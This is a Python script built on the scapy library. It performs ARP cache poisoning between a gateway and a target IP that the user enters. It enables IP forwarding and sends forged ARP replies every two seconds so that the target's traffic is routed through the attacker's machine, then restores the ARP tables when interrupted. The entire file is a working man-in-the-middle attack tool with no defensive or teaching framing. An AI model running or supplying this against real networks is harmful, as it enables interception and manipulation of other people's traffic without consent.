import scapy.all as scapy
import time
import argparse
import sys
import os
import subprocess


def Arp(ip):
        arp_r = scapy.ARP(pdst=ip)
        br = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        request = br/arp_r
        answered, unanswered = scapy.srp(request, timeout = 1, iface = 'wlx08beac183cc4', inter = 0.1)
        for i in answered:
            ip, mac = i[1].psrc, i[1].hwsrc
        return mac


def spoofer(targetIP, spoofIP, dstMAC):
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=dstMAC,psrc=spoofIP)
    scapy.send(packet, verbose=False)
    
def restore(destinationIP, sourceIP,srcMAC, dstMAC):
    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=dstMAC,psrc=sourceIP,hwsrc=srcMAC)
    scapy.send(packet, count=4,verbose=False)

def getmac(interface):

  try:
    mac = open('/sys/class/net/'+interface+'/address').readline()
  except:
    mac = "00:00:00:00:00:00"

  return mac[0:17]

myMAC = getmac("wlx08beac183cc4")

GW_IP = input('Enter a gateway IP: ')

GW_MAC = Arp(GW_IP)


TG_IP = input('Enter a target IP: ')

TG_MAC = Arp(TG_IP)

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
packets = 0
try:
    while True:
        spoofer(TG_IP,GW_IP,myMAC)
        spoofer(GW_IP,TG_IP,myMAC)
        print("\r[+] Sent packets "+ str(packets)),
        sys.stdout.flush()
        packets +=2
        time.sleep(2)
except KeyboardInterrupt:
    print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
    restore(TG_IP,GW_IP,GW_MAC, TG_MAC)
    restore(GW_IP,TG_IP,TG_MAC, GW_MAC )
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
